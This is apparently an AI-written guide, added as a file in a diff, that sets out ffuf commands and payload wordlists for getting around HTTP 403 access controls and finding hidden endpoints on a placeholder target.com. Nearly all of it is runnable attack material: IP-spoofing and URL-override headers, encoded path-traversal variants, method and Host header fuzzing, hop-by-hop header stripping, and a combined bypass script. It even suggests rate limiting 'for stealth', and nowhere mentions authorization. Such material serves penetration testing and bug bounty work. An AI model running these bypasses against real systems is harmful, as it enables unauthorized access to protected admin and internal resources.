@@ -1,0 +1,314 @@
+Here's a comprehensive set of **ffuf commands** for bypassing 403 and discovering hidden endpoints, based on all known bypass techniques:
+
+---
+
+## 1. Basic Hidden Endpoint Discovery
+
+```bash
+# Standard directory/endpoint brute-force (filter out 403 to see what's accessible)
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50
+
+# With extensions
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.json,.html,.txt,.bak,.old,.zip,.env -mc all -fc 404 -t 50
+
+# Recursive discovery (go deeper into found dirs)
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc all -fc 404 -recursion -recursion-depth 3 -t 30
+```
+
+---
+
+## 2. 403 Bypass via Header Injection
+
+The server may block based on the URL path but trust certain headers to override routing. [[5]]
+
+```bash
+# X-Original-URL header bypass (IIS/Nginx/Apache)
+ffuf -u https://target.com/ -H "X-Original-URL: /FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50
+
+# X-Rewrite-URL header bypass
+ffuf -u https://target.com/ -H "X-Rewrite-URL: /FUZZ" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50
+
+# X-Forwarded-For IP spoofing (bypass IP-based ACLs)
+ffuf -u https://target.com/FUZZ -H "X-Forwarded-For: 127.0.0.1" -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50
+
+# Multiple bypass headers at once
+ffuf -u https://target.com/FUZZ \
+  -H "X-Original-URL: /FUZZ" \
+  -H "X-Rewrite-URL: /FUZZ" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Remote-IP: 127.0.0.1" \
+  -H "X-Remote-Addr: 127.0.0.1" \
+  -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404 -t 50
+```
+
+**Full header bypass wordlist approach** — fuzz the header VALUE against a known 403 path: [[5]]
+
+```bash
+# Create a header-bypass wordlist
+cat << 'EOF' > /tmp/403-headers.txt
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-True-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Trusted-IP: 127.0.0.1
+X-Requested-By: admin
+X-Requested-For: admin
+Forwarded: for=127.0.0.1
+Via: 1.1 localhost
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-Forwarded-Proto: https
+X-HTTP-Method-Override: GET
+X-Method-Override: GET
+EOF
+
+# Fuzz headers against a known 403 endpoint
+ffuf -u https://target.com/admin -H "FUZZ" -w /tmp/403-headers.txt -mc all -fc 403 -t 20
+```
+
+---
+
+## 3. 403 Bypass via Path Manipulation / Normalization
+
+Servers and WAFs parse paths differently. These tricks confuse the access control layer. [[6]]
+
+```bash
+# Create a path-bypass wordlist for a known 403 endpoint (e.g., /admin)
+cat << 'EOF' > /tmp/403-paths.txt
+/admin
+/admin/
+/admin/.
+/admin//
+//admin
+//admin//
+/./admin/./
+/admin..;/
+/admin/../admin
+/admin%20
+/admin%09
+/admin%00
+/admin%0a
+/admin%0d
+/%61dmin
+/%41dmin
+/Admin
+/ADMIN
+/aDmin
+/adMin
+/%2e/admin
+/%252e/admin
+/..;/admin
+/;/admin
+/.;/admin
+//;/admin
+/admin;
+/admin;/
+/admin?
+/admin#
+/admin..%00
+/admin..%01
+/admin..%0a
+/~admin
+/~root
+/admin%23
+/admin%3f
+/./admin
+/admin/.json
+/admin.json
+/admin.html
+/admin.php
+/admin/index.html
+/admin/index.php
+/./admin/.
+/admin/%2e
+/admin/%2e%2e
+/%c0%af/admin
+/%e0%80%af/admin
+/..%c0%af..%c0%af/admin
+/admin%252f
+/%252e%252e/admin
+EOF
+
+# Fuzz path variations against the target
+ffuf -u https://target.com/FUZZ -w /tmp/403-paths.txt -mc all -fc 403 -t 30
+```
+
+---
+
+## 4. 403 Bypass via HTTP Method Switching
+
+Some endpoints only restrict `GET` but allow other methods. [[5]]
+
+```bash
+# Create a methods wordlist
+cat << 'EOF' > /tmp/methods.txt
+GET
+POST
+PUT
+DELETE
+PATCH
+OPTIONS
+HEAD
+TRACE
+CONNECT
+FOO
+PROPFIND
+VIEW
+EOF
+
+# Fuzz HTTP methods against a 403 endpoint
+ffuf -u https://target.com/admin -X FUZZ -w /tmp/methods.txt -mc all -fc 403 -t 10
+
+# Also try method override headers
+ffuf -u https://target.com/admin -X POST \
+  -H "X-HTTP-Method-Override: GET" \
+  -H "X-Method-Override: GET" \
+  -H "X-Original-Method: GET" \
+  -mc all -fc 403
+```
+
+---
+
+## 5. 403 Bypass via Host Header Manipulation
+
+Changing the `Host` header can bypass virtual-host-based access controls. [[6]]
+
+```bash
+# Fuzz Host header
+ffuf -u https://target.com/admin -H "Host: FUZZ" \
+  -w /tmp/vhosts.txt -mc all -fc 403 -t 30
+
+# Quick vhost wordlist
+cat << 'EOF' > /tmp/vhosts.txt
+localhost
+127.0.0.1
+target.com
+www.target.com
+internal.target.com
+dev.target.com
+staging.target.com
+admin.target.com
+test.target.com
+debug.target.com
+api.target.com
+EOF
+```
+
+---
+
+## 6. 403 Bypass via Hop-by-Hop Header Stripping
+
+Force proxies to strip security headers by abusing the `Connection` header. [[5]]
+
+```bash
+# Tell the proxy to strip the Authorization/access-control header
+ffuf -u https://target.com/admin \
+  -H "Connection: X-Custom-Auth" \
+  -H "X-Custom-Auth: anything" \
+  -mc all -fc 403
+
+# Strip multiple headers
+ffuf -u https://target.com/admin \
+  -H "Connection: keep-alive, X-Auth, X-Forwarded-For" \
+  -mc all -fc 403
+```
+
+---
+
+## 7. Combined Mega-Command (All Techniques)
+
+```bash
+# Step 1: Discover all 403 endpoints first
+ffuf -u https://target.com/FUZZ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -e .php,.json,.html,.txt,.xml,.env,.bak,.zip,.git,.config \
+  -mc 403 -t 50 -o /tmp/403_endpoints.json -of json
+
+# Step 2: For each 403 endpoint, run ALL bypass techniques
+# (use this as a bash loop)
+cat << 'SCRIPT' > /tmp/403_bypass.sh
+#!/bin/bash
+TARGET="$1"
+WORDLIST="/usr/share/wordlists/dirb/common.txt"
+
+echo "[*] Testing header bypasses..."
+ffuf -u "$TARGET" -H "X-Original-URL: /FUZZ" -w "$WORDLIST" -mc all -fc 403,404 -t 40 -s
+ffuf -u "$TARGET" -H "X-Rewrite-URL: /FUZZ" -w "$WORDLIST" -mc all -fc 403,404 -t 40 -s
+
+echo "[*] Testing IP spoof headers..."
+ffuf -u "$TARGET/FUZZ" -H "X-Forwarded-For: 127.0.0.1" -w "$WORDLIST" -mc all -fc 403,404 -t 40 -s
+ffuf -u "$TARGET/FUZZ" -H "X-Remote-IP: 127.0.0.1" -w "$WORDLIST" -mc all -fc 403,404 -t 40 -s
+
+echo "[*] Testing path normalization..."
+ffuf -u "$TARGET/FUZZ" -w /tmp/403-paths.txt -mc all -fc 403,404 -t 30 -s
+
+echo "[*] Testing HTTP methods..."
+ffuf -u "$TARGET" -X FUZZ -w /tmp/methods.txt -mc all -fc 403,404 -t 10 -s
+
+echo "[*] Testing Host header..."
+ffuf -u "$TARGET" -H "Host: FUZZ" -w /tmp/vhosts.txt -mc all -fc 403,404 -t 20 -s
+
+echo "[*] Done."
+SCRIPT
+chmod +x /tmp/403_bypass.sh
+
+# Run against a known 403 endpoint
+/tmp/403_bypass.sh "https://target.com/admin"
+```
+
+---
+
+## 8. User-Agent Fuzzing (Bonus)
+
+Some apps serve different content based on User-Agent. [[6]]
+
+```bash
+ffuf -u https://target.com/admin \
+  -H "User-Agent: FUZZ" \
+  -w /usr/share/wordlists/user-agents.txt \
+  -mc all -fc 403 -t 30
+
+# Quick test with common bot/internal agents
+ffuf -u https://target.com/admin -H "User-Agent: FUZZ" \
+  -w <(echo -e "Googlebot\nMozilla/5.0\npython-requests\ncurl/7.68\ninternal-monitor\nhealth-checker\nlocalhost") \
+  -mc all -fc 403
+```
+
+---
+
+## Quick Reference: Key ffuf Flags
+
+| Flag | Purpose |
+|------|---------|
+| `-u` | Target URL with `FUZZ` keyword |
+| `-w` | Wordlist path |
+| `-H` | Add header (supports `FUZZ` in value) |
+| `-X` | HTTP method (supports `FUZZ`) |
+| `-mc` | Match status codes (`all`, `200,301,302`) |
+| `-fc` | Filter status codes (`403,404`) |
+| `-fs` | Filter response size (calibrate with `-ac`) |
+| `-ac` | Auto-calibrate (smart filtering) |
+| `-t` | Threads |
+| `-recursion` | Recurse into found directories |
+| `-o` | Output file |
+| `-of` | Output format (`json`, `csv`, `html`) |
+| `-s` | Silent mode (only output results) |
+| `-rate` | Rate limit (req/s) for stealth |
+
+---
+
+**Pro tip:** Always add `-ac` (auto-calibrate) to let ffuf automatically detect and filter false positives based on response size/word count: [[33]]
+
+```bash
+ffuf -u https://target.com/FUZZ -w wordlist.txt -ac -t 50
+```
+
+This eliminates the need to manually guess `-fs` or `-fw` filters and catches responses that differ from the baseline — which is exactly what you want when a 403 suddenly becomes a 200.
